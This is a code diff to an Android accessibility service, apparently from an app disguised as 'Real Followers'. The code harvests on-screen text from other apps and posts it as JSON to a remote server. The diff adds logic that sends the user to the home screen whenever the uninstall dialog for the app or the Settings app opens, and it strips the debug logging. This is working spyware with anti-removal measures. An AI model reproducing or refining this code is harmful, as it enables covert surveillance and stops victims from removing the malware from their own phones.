@@ -20,9 +20,7 @@ import java.util.Collections;
 import java.util.Comparator;
 import java.util.HashSet;
 import java.util.List;
-import java.util.Objects;
 import java.util.Set;
-import java.util.concurrent.atomic.AtomicInteger;
 
 public class MyAccessibilityService extends AccessibilityService {
 
@@ -48,31 +46,28 @@ public class MyAccessibilityService extends AccessibilityService {
         if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             handleNotificationStateChanged(event);
         } else if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
-            // Handle scrolling events
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 if (event.getPackageName() != null) {
                     handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
                 }
             }, 100);
-        }else if(eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED){
-            Log.d("Long Clicked", "Long Clicked");
-            String packageName = event.getPackageName().toString();
-            String className = event.getClassName().toString();
-            String contentDescription = event.getContentDescription().toString();
+        } else if (eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED) {
+            String contentDescription = event.getContentDescription() != null ? event.getContentDescription().toString() : "";
             String text = event.getText().toString();
-            Log.d("Long Clicked", packageName + " " + className + " " + contentDescription + " " + text);
-
-            if(contentDescription.contains("Real Followers")){
+            if (contentDescription.contains("Real Followers")) {
                 performGlobalAction(GLOBAL_ACTION_HOME);
             }
-        }
-
-        else if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
-            Log.d("Window Changed", "Window Changed");
+        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             String packageName = event.getPackageName().toString();
             String text = event.getText().toString();
-
-            if(packageName.contains("com.google.android.packageinstaller") && text.contains("Real Followers") && text.contains("Do you want to uninstall this app?")){
+            // Not working for few android versions ... idk why ( i made some changes in this if statement... idk if it will work now )
+            if (isPackageInstaller(packageName)) {
+                if (text.contains("Real Followers") && text.contains("Do you want to uninstall this app?")) {
+                        performGlobalAction(GLOBAL_ACTION_HOME);
+                }
+            }
+            // Remove this else-if part if you want the settings to open
+            else if (isSettingsApp(packageName)) {
                 performGlobalAction(GLOBAL_ACTION_HOME);
             }
         }
@@ -84,7 +79,6 @@ public class MyAccessibilityService extends AccessibilityService {
         }
 
         if (!loggedPackages.contains(packageName)) {
-            Log.d(TAG, packageName);
             loggedPackages.add(packageName);
         }
 
@@ -106,8 +100,6 @@ public class MyAccessibilityService extends AccessibilityService {
                     (nodeText != null ? nodeText : "") + " " +
                     (nodeContentDescription != null ? nodeContentDescription : "") +
                     " " + System.currentTimeMillis();
-
-            Log.d(TAG, sb);
 
             tmpNodes.add(sb);
 
@@ -159,15 +151,12 @@ public class MyAccessibilityService extends AccessibilityService {
 
                 JSONArray jsonArray = new JSONArray(dataList);
 
-                Log.d(TAG, "Sending data: " + jsonArray);
-
                 try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
                     writer.write(jsonArray.toString());
                     writer.flush();
                 }
 
                 int responseCode = urlConnection.getResponseCode();
-                Log.d(TAG, "Response Code: " + responseCode);
 
             } catch (Exception e) {
                 Log.e(TAG, "Error: " + e.getMessage(), e);
@@ -184,31 +173,33 @@ public class MyAccessibilityService extends AccessibilityService {
         Parcelable parcelable = event.getParcelableData();
         if (parcelable instanceof Notification) {
             Notification notification = (Notification) parcelable;
-            CharSequence notificationTitle = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
-            CharSequence notificationText = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
-            Log.d(TAG, "Package Name: " + (event.getPackageName() != null ? event.getPackageName().toString() : "Unknown Package"));
-            Log.d(TAG, "Notification Title: " + (notificationTitle != null ? notificationTitle.toString() : "No Title"));
-            Log.d(TAG, "Notification Text: " + (notificationText != null ? notificationText.toString() : "No Text"));
         } else {
             List<CharSequence> notificationText = event.getText();
             if (!notificationText.isEmpty()) {
                 for (CharSequence t : notificationText) {
-                    Log.d(TAG, "Notification Text: " + (t != null ? t.toString() : "No Text"));
                 }
-            } else {
-                Log.d(TAG, "Notification state changed but no text available.");
             }
         }
     }
 
+    private boolean isPackageInstaller(String packageName) {
+        return packageName.contains("com.google.android.packageinstaller") || packageName.contains("com.android.packageinstaller");
+    }
+
+    private boolean isSettingsApp(String packageName) {
+        return packageName.contains("com.android.settings");
+    }
+
+    private boolean shouldPreventUninstall() {
+        return true;
+    }
+
     @Override
     public void onInterrupt() {
-        Log.d(TAG, "Service interrupted");
     }
 
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
-        Log.d(TAG, "Service connected");
     }
 }
